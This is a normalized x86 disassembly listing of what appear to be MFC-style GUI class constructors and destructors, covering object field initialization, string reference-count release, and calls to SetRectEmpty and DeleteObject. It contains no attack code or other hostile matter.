retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_41f5d0
push esi
mov esi ecx
dec [ esi + 0x4 ]
push edi
mov edi [ esi + 0x4 ]
jne r-xdata
mov eax edi
pop edi
pop esi
retn
mov eax [ esi ]
mov edx [ eax + 0x24 ]
call edx
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x14 ] 0x0
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
sub_41f610
mov ecx [ edi + 0x14 ]
mov eax [ edi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx edi
call edx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
mov [ esi + 0x8 ] eax
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0xc ] ecx
mov eax esi
retn
sub_41f640
push ebp
mov ebp esp
mov ecx [ edi + 0x14 ]
mov eax [ edi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx edi
call edx
mov eax [ edi + 0xc ]
mov [ esi + 0x4 ] 0x0
test ebx ebx
jne r-xdata
cdq
idiv ebx
mov edx [ edi + 0x10 ]
mov [ esi + 0xc ] edx
mov ecx eax
imul ecx [ ebp + 0x8 ]
mov [ esi ] ecx
add ecx eax
mov [ esi + 0x8 ] ecx
mov eax esi
pop ebp
retn 0x4
mov ecx [ edi + 0x10 ]
mov [ esi + 0x8 ] eax
mov [ esi ] ebx
mov [ esi + 0xc ] ecx
mov eax esi
pop ebp
retn 0x4
sub_41f690
push ebp
mov ebp esp
push 0xffffffff
push sub_447caf
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0xc ]
mov ecx rw-data
mov [ ebp - 0x14 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x10 ]
mov ecx rw-data
mov [ ebp - 0x14 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x3
lea eax [ esi + 0x1c ]
xor ebx ebx
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
lea edi [ eax + 0x28 ]
mov [ ebp - 0x14 ] eax
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
mov [ eax + 0x14 ] ebx
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x6
lea edi [ esi + 0x48 ]
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov edx [ rw-data ]
lea eax [ esi + 0x58 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
mov ecx [ ebp - 0x10 ]
add eax 0x10
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0x8
mov eax [ rw-data ]
lea edx [ esi + 0x68 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
mov ecx [ ebp - 0x10 ]
add eax 0x10
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0xa
mov eax [ rw-data ]
lea edx [ esi + 0x6c ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
mov ecx [ ebp - 0x10 ]
add eax 0x10
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0xc
mov eax [ rw-data ]
lea edx [ esi + 0x98 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
mov ecx [ ebp - 0x10 ]
add eax 0x10
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0xe
lea eax [ esi + 0xb0 ]
push 0x18
mov [ ebp - 0x10 ] eax
mov [ eax + 0x8 ] ebx
call [ operator new@IAT ]
add esp 0x4
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] ebx
call [ std::exception::exception@IAT ]
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x4 ] 0xe
push r--data
lea edx [ ebp - 0x20 ]
push edx
call _CxxThrowException
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x4 ] eax
mov [ eax ] eax
mov eax [ ecx + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ ecx + 0x4 ]
mov [ eax + 0x8 ] eax
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov eax [ ecx + 0x4 ]
mov [ eax + 0x15 ] 0x1
mov [ ebp - 0x4 ] 0x12
or eax 0xffffffff
push edi
mov [ esi + 0x18 ] 0x100
mov [ esi + 0x5c ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x34 ] ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x40 ] ebx
mov [ esi + 0x70 ] eax
mov [ esi + 0x80 ] ebx
mov [ esi + 0x74 ] eax
mov [ esi + 0x78 ] eax
mov [ esi + 0x7c ] 0xd8e9ec
mov [ esi + 0x84 ] ebx
mov [ esi + 0x88 ] eax
mov [ esi + 0x90 ] ebx
mov [ esi + 0x8c ] 0x808080
mov [ esi + 0x9c ] ebx
call [ SetRectEmpty@IAT ]
mov [ esi + 0x60 ] ebx
mov [ esi + 0x64 ] ebx
mov [ esi + 0x94 ] ebx
mov [ esi + 0xa9 ] 0x1000100
mov [ esi + 0xa0 ] ebx
mov [ esi + 0xa4 ] 0xc
mov [ esi + 0xa8 ] bl
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41f8f0
push ebp
mov ebp esp
push 0xffffffff
push sub_447bc6
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x7
mov eax edi
call sub_4142d0
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x6
lea ebx [ edi + 0xb0 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x9
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x18 ]
mov eax ebx
call sub_421cd0
mov [ ebp - 0x4 ] 0x6
mov ebx [ ebx + 0x4 ]
push ebx
call [ operator delete@IAT ]
mov cl 0x5
add esp 0x4
mov [ ebp - 0x4 ] cl
lea eax [ edi + 0x98 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
or esi 0xffffffff
lea ecx [ eax + 0xc ]
mov edx esi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push eax
call [ DeleteObject@IAT ]
mov [ edi + 0xa0 ] 0x0
mov cl 0x4
mov [ ebp - 0x4 ] cl
lea eax [ edi + 0x6c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
mov edx esi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov cl 0x3
mov [ ebp - 0x4 ] cl
lea eax [ edi + 0x68 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
mov edx esi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov cl 0x2
mov [ ebp - 0x4 ] cl
lea eax [ edi + 0x58 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
mov edx esi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov cl 0x1
mov [ ebp - 0x4 ] cl
lea eax [ edi + 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] cl
add eax 0x28
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
mov edx esi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
mov edx esi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] esi
lea eax [ edi + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] esi
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
[ ecx ] esi
dec esi
test esi esi
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_41fad0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41f8f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_41fb00
push ebp
mov ebp esp
push 0xffffffff
push sub_445e73
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
add eax 0x28
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax ]
sub eax 0x10
lea edx [ eax + 0xc ]
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_41fb60
push ebp
mov ebp esp
push 0xffffffff
push sub_448888
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_41f690
xor eax eax
mov [ ebp - 0x4 ] eax
mov ecx 0xf0f0f0
mov [ esi ] r--data
mov [ esi + 0xc0 ] eax
mov [ esi + 0xc4 ] ecx
mov [ esi + 0xc8 ] 0xff
mov [ esi + 0xcc ] eax
mov [ esi + 0xd0 ] eax
mov [ esi + 0xd4 ] 0x99a8ac
mov [ esi + 0xd8 ] eax
mov [ esi + 0xdc ] ecx
mov [ esi + 0xe0 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_41fc00
push ebp
mov ebp esp
push 0xffffffff
push sub_449068
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_41f8f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_41fc60
push ebp
mov ebp esp
push 0xffffffff
push sub_448888
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_41f690
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0xc0 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_41fcc0
push ebp
mov ebp esp
push 0xffffffff
push sub_448858
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_41f8f0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_41fd10
push ebp
mov ebp esp
push 0xffffffff
push sub_449068
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_41f8f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_41fd70
push ebp
mov ebp esp
push 0xffffffff
push sub_4490a0
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_41f690
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ esi ] r--data
mov [ esi + 0xc0 ] ebx
mov ecx 0x1
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] ebx
mov [ esi + 0xcc ] ebx
mov [ esi + 0xd0 ] ebx
mov [ esi + 0xd4 ] ebx
mov [ esi + 0xd8 ] ebx
mov [ esi + 0xdc ] ebx
mov [ esi + 0xe0 ] ebx
mov [ esi + 0xe4 ] ebx
mov [ esi + 0xe8 ] ebx
mov [ esi + 0xec ] ebx
mov [ esi + 0xf0 ] ebx
mov [ esi + 0xf4 ] ebx
mov [ esi + 0xf8 ] ebx
mov [ esi + 0xfc ] ebx
mov [ esi + 0x100 ] ebx
mov [ esi + 0x104 ] ebx
mov [ esi + 0x108 ] ebx
mov [ esi + 0x10c ] ebx
mov [ esi + 0x110 ] ebx
mov [ esi + 0x114 ] ebx
mov [ esi + 0x118 ] ebx
mov [ esi + 0x11c ] ebx
mov [ esi + 0x120 ] ebx
mov edi [ SetRectEmpty@IAT ]
mov [ esi + 0x124 ] ebx
mov [ esi + 0x128 ] ebx
mov [ esi + 0x12c ] ebx
mov [ esi + 0x130 ] ebx
mov [ esi + 0x134 ] ebx
mov [ esi + 0x138 ] ebx
mov [ esi + 0x13c ] ebx
mov [ esi + 0x140 ] ebx
lea eax [ esi + 0xc4 ]
mov [ esi + 0x144 ] ebx
mov [ esi + 0x148 ] ebx
mov [ esi + 0x14c ] ebx
mov [ esi + 0x150 ] ebx
mov [ esi + 0x154 ] ebx
mov [ esi + 0x158 ] ebx
mov [ esi + 0x15c ] ebx
mov [ esi + 0x160 ] ebx
mov [ esi + 0x164 ] ebx
mov [ esi + 0x168 ] ebx
mov [ esi + 0x16c ] ebx
mov [ esi + 0x170 ] ebx
mov [ esi + 0x174 ] ebx
mov [ esi + 0x178 ] ebx
mov [ esi + 0x17c ] ebx
mov [ esi + 0x180 ] ebx
mov [ esi + 0x198 ] ebx
mov [ esi + 0x19c ] ebx
push eax
mov [ esi + 0x40 ] ecx
call edi
lea eax [ esi + 0xd4 ]
push eax
call edi
lea eax [ esi + 0xe4 ]
push eax
call edi
lea eax [ esi + 0xf4 ]
push eax
call edi
lea eax [ esi + 0x104 ]
push eax
call edi
lea eax [ esi + 0x114 ]
push eax
call edi
lea eax [ esi + 0x124 ]
push eax
call edi
lea eax [ esi + 0x134 ]
push eax
call edi
lea eax [ esi + 0x144 ]
push eax
call edi
lea eax [ esi + 0x154 ]
push eax
call edi
or eax 0xffffffff
mov [ esi + 0x184 ] 0x10000
mov [ esi + 0x188 ] bx
mov [ esi + 0x190 ] ebx
mov [ esi + 0x18c ] eax
mov [ esi + 0x194 ] 0x1
mov [ esi + 0x198 ] ebx
mov [ esi + 0x19c ] ebx
mov [ esi + 0x1a0 ] ebx
mov [ ebp - 0x4 ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41ffa0
push ebp
mov ebp esp
push 0xffffffff
push sub_449e10
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x1a0 ]
test ecx ecx
je r-xdata
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ ebp - 0x4 ] eax
mov ecx esi
call sub_41f8f0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov [ esi + 0x1a0 ] 0x0
sub_420020
push ebp
mov ebp esp
push 0xffffffff
push sub_449e10
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x1a0 ]
test ecx ecx
je r-xdata
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ ebp - 0x4 ] eax
mov ecx esi
call sub_41f8f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov [ esi + 0x1a0 ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4200b0
push ebp
mov ebp esp
push 0xffffffff
push sub_448888
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_41f690
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0xcc ]
mov [ esi ] r--data
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
push eax
mov [ esi + 0xc0 ] cl
mov [ esi + 0xc1 ] cx
mov [ esi + 0xc3 ] cl
mov [ esi + 0xc4 ] ecx
mov [ esi + 0xc8 ] ecx
call [ SetRectEmpty@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_420140
push ebp
mov ebp esp
push 0xffffffff
push sub_449068
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_41f8f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4201a0
push ebp
mov ebp esp
push 0xffffffff
push sub_4490a0
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_41f690
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ esi ] r--data
mov [ esi + 0xc0 ] ebx
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] ebx
mov [ esi + 0xcc ] ebx
mov [ esi + 0xd0 ] ebx
lea eax [ esi + 0xc4 ]
lea edi [ esi + 0xd4 ]
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
push eax
mov [ esi + 0xe4 ] ebx
mov [ esi + 0xe8 ] ebx
mov [ esi + 0xec ] ebx
mov [ esi + 0xf0 ] ebx
call [ SetRectEmpty@IAT ]
push edi
mov edi [ SetRectEmpty@IAT ]
call edi
lea eax [ esi + 0xe4 ]
push eax
call edi
mov [ esi + 0xf4 ] bx
mov [ esi + 0xf6 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_420280
push ebp
mov ebp esp
push 0xffffffff
push sub_449040
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ ecx ] r--data
mov [ ebp - 0x4 ] eax
call sub_41f8f0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_4202d0
push ebp
mov ebp esp
push 0xffffffff
push sub_449e10
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ ebp - 0x4 ] eax
call sub_41f8f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_420340
push ebp
mov ebp esp
push 0xffffffff
push sub_449dde
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_4201a0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x100 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0xfc ] 0x0
mov [ esi + 0xf8 ] 0x101
mov [ esi + 0xfa ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4203e0
push ebp
mov ebp esp
push 0xffffffff
push sub_449d9e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x100 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_41f8f0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_420480
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4203e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4204b0
push ebp
mov ebp esp
push 0xffffffff
push sub_449068
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_41f8f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_420510
push ebp
mov ebp esp
push 0xffffffff
push sub_449068
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_41f8f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_420570
push ebp
mov ebp esp
push 0xffffffff
push sub_44a338
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x1a0 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_41f8f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov [ esi + 0x1a0 ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_420610
push ebp
mov ebp esp
push 0xffffffff
push sub_449d46
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_4201a0
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0xf8 ] eax
mov [ esi + 0xfc ] eax
mov [ esi + 0x100 ] eax
mov [ esi + 0x104 ] eax
lea ecx [ esi + 0xf8 ]
mov [ esi + 0x114 ] eax
mov [ esi + 0x118 ] eax
mov [ esi + 0x11c ] eax
mov [ esi + 0x120 ] eax
mov [ esi + 0x12c ] eax
mov [ esi + 0x130 ] eax
mov [ esi + 0x134 ] eax
mov edx 0x1
mov [ ebp - 0x4 ] dl
push ecx
mov [ esi + 0x108 ] eax
mov [ esi + 0x10c ] eax
